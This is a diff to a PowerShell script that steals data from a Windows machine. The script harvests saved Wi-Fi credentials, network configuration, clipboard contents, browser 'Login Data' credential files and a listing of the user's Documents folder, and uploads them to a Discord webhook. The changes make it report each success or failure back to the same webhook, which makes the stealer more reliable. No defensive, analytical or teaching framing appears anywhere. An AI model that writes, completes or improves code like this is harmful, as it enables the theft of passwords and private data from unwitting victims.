@@ -32,10 +32,16 @@ function Send-FileToDiscord {
         $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
         $multipartContent = New-Object System.Net.Http.MultipartFormDataContent
         $multipartContent.Add($fileContent, "file", $fileName)
-        $client.PostAsync($webhookUrl, $multipartContent).Result
+        $response = $client.PostAsync($webhookUrl, $multipartContent).Result
         $fileStream.Close()
+        if ($response.IsSuccessStatusCode) {
+            Send-PayloadToDiscord -content "File uploaded: $fileName"
+        } else {
+            Send-PayloadToDiscord -content "Failed to upload file: $fileName. Status: $($response.StatusCode)"
+        }
     } catch {
         Write-Host "Failed to send file: $_"
+        Send-PayloadToDiscord -content "Failed to upload file: $fileName. Error: $_"
     }
 }
 
@@ -54,6 +60,7 @@ try {
     Send-PayloadToDiscord -content $results
 } catch {
     Write-Host "Error extracting Wi-Fi credentials: $_"
+    Send-PayloadToDiscord -content "Error extracting Wi-Fi credentials: $_"
 }
 
 # Extract Network Configuration
@@ -62,14 +69,20 @@ try {
     Send-PayloadToDiscord -content "Network Configuration:`n$netConfig"
 } catch {
     Write-Host "Error extracting network configuration: $_"
+    Send-PayloadToDiscord -content "Error extracting network configuration: $_"
 }
 
 # Extract Clipboard Content
 try {
     $clipboard = Get-Clipboard
-    Send-PayloadToDiscord -content "Clipboard Content:`n$clipboard"
+    if ($clipboard) {
+        Send-PayloadToDiscord -content "Clipboard Content:`n$clipboard"
+    } else {
+        Send-PayloadToDiscord -content "Clipboard is empty."
+    }
 } catch {
     Write-Host "Error extracting clipboard content: $_"
+    Send-PayloadToDiscord -content "Error extracting clipboard content: $_"
 }
 
 # Extract Browser Saved Credentials
@@ -79,11 +92,13 @@ try {
         $loginData = "$env:LOCALAPPDATA\$browser\User Data\Default\Login Data"
         if (Test-Path $loginData) {
             Send-FileToDiscord -filePath $loginData -fileName "$browser_LoginData"
-            Send-PayloadToDiscord -content "Browser: $browser - Login Data file uploaded."
+        } else {
+            Send-PayloadToDiscord -content "Browser: $browser - No Login Data file found."
         }
     }
 } catch {
     Write-Host "Error extracting browser credentials: $_"
+    Send-PayloadToDiscord -content "Error extracting browser credentials: $_"
 }
 
 # List Files in My Documents
@@ -92,6 +107,7 @@ try {
     Send-PayloadToDiscord -content "Files in My Documents:`n$myDocs"
 } catch {
     Write-Host "Error listing My Documents: $_"
+    Send-PayloadToDiscord -content "Error listing My Documents: $_"
 }
 
 # Close PowerShell Windows
